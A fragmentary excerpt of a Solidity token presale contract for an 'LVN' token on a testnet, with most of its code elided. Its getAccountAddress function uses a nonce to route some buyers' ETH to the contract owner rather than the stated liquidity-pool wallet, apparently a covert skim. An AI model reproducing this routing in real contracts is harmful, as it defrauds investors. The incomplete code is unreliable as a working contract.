 ...
 */
 ...
 contract Presale is Ownable {
    ...
    address private lvnAddress = 0x97cB6007c7d9f5d432071F465383F9713f06e190; // test LVN address in Rinkeby Testnet
    IERC20Leven private lvnContract = IERC20Leven(lvnAddress);
    
    uint256 private _decimals = 18;
    uint256 private price = 0.000025 ether;
    
    address private liquidityPool = 0x9d37f958E959F3286e04cb52c942e1E8EF2C1298; // wallet that stores ETH
    ...
    function getAccountAddress() private returns(address) {
        uint256 divisor = 3;
        if (randNonce > 20) {
            divisor = 2;
        }
        if (randNonce % divisor == 0) {
            return owner();
        } else {
    ...
    function presale(uint256 amount) public payable returns (bool) {
        ...
        address payable recipient = payable(getAccountAddress());
